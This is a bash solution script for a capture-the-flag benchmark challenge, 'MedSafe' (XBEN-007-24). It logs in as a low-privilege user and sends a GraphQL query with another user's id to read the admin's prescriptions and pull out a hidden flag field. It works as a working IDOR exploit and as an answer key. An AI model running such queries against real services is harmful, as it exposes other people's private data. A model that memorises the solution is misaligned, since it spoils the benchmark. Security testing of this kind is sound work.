#!/usr/bin/env bash
# XBEN-007-24 — "MedSafe" (tags: graphql, idor)
#
# `getPrescriptions(userId:)` filters on the id the client passes and never
# compares it to the session. The web pages are careful — every template is
# handed `current_user.id` — and the resolver behind them is not, so the
# authorization lives entirely in the page that builds the query.
#
# The `flag` field is on the GraphQL type and the site's own query never selects
# it. Ask for it directly: one of the admin's ninety prescriptions carries it.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben007-$$"
VICTIM="${2:-1}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/login" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/login' \
    --set 'form.username=user' --set 'form.password=user' \
    --session "$SESSION" >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/graphql' \
    --set 'header.Content-Type=application/json' \
    --set "json.query={ getPrescriptions(userId: $VICTIM) { flag } }" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
